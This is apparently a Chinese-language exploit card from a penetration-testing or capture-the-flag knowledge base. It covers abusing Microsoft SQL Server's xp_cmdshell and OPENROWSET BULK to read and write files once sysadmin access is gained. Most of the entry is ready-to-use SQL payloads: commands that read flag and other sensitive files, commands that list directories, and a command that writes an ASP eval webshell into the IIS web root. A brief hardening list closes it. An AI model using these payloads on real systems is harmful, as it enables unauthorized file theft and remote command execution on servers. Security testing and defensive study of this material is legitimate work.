---
id: MSSQL-FILE-RW
title: "MSSQL - 文件读写操作"
product: mssql
vendor: Microsoft
version_affected: "all versions (misconfiguration)"
severity: HIGH
tags: [文件读写, xp_cmdshell, openrowset, 需要认证]
fingerprint: ["Microsoft SQL Server"]
---

## 漏洞描述

MSSQL 提供多种方式读写文件系统。通过 xp_cmdshell 调用系统命令可直接操作文件，OPENROWSET 的 BULK 选项可以读取任意文件内容为表数据。这些功能在获取 sysadmin 权限后可被利用来读取敏感文件（如 flag、配置文件）或写入 Webshell 等恶意文件。

## 影响版本

- 所有版本（需要 sysadmin 权限或相关权限）

## 前置条件

- sysadmin 权限或具有 ADMINISTER BULK OPERATIONS 权限
- 对应功能已启用（xp_cmdshell 或 Ad Hoc Distributed Queries）

## 利用步骤

### 读取文件

```sql
-- 方法 1: 通过 xp_cmdshell 读取
EXEC xp_cmdshell 'type C:\flag.txt';

-- 方法 2: 通过 OPENROWSET BULK 读取（无需 xp_cmdshell）
SELECT * FROM OPENROWSET(BULK 'C:\flag.txt', SINGLE_CLOB) AS x;
```

### 写入文件

```sql
-- 方法 1: 通过 xp_cmdshell 写入
EXEC xp_cmdshell 'echo test > C:\Windows\Temp\test.txt';

-- 方法 2: 写入 Webshell
EXEC xp_cmdshell 'echo ^<%eval request("cmd")%^> > C:\inetpub\wwwroot\shell.asp';
```

## Payload

```sql
-- 读取 flag 文件常用路径
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS x;

-- 批量读取目录内容
EXEC xp_cmdshell 'dir C:\Users\Administrator\Desktop\';
```

## 修复建议

1. 禁用 xp_cmdshell
2. 禁用 Ad Hoc Distributed Queries（限制 OPENROWSET）
3. 使用最小权限原则，避免使用 sysadmin 账号
4. 监控文件系统异常读写操作
